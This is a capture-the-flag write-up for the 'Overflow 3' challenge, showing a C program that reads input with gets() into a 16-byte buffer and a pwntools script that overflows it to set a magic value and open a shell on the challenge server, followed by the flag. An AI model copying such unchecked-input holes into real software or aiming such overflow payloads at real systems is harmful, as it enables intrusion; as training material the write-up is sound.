# Overflow 3 (250 points)

## Description

looks like buffer overflows aren’t so easy anymore.

nc cyberyoddha.baycyber.net 10003  
## Solution

Here is the file we were given.

```c  
int main(void) {  
	long vuln = 0;  
       char buf[16];

	gets(buf);

	if (vuln == 0xd3adb33f){  
		system("/bin/sh");  
	}  
}  
```

Address is **0xd3adb33f** and buffer size is 16. Now let's open python and
write another script:

```python  
from pwn import *

payload = "A"*28  
payload += p32(0xd3adb33f)  
s = remote("cyberyoddha.baycyber.net", 10003)  
s.sendline(payload)  
s.interactive()  
```  
```shell  
$ python overflow3.py  
[+] Opening connection to cyberyoddha.baycyber.net on port 10003: Done  
[*] Switching to interactive mode  
$ ls  
flag.txt  
overflow3  
$ cat flag.txt  
CYCTF{wh0@_y0u_jump3d_t0_th3_funct!0n}  
```

Flag: CYCTF{wh0@_y0u_jump3d_t0_th3_funct!0n}

Original writeup
(https://github.com/holypower777/ctf_writeups/tree/main/cyberYoddhaCTF_2020/overflow).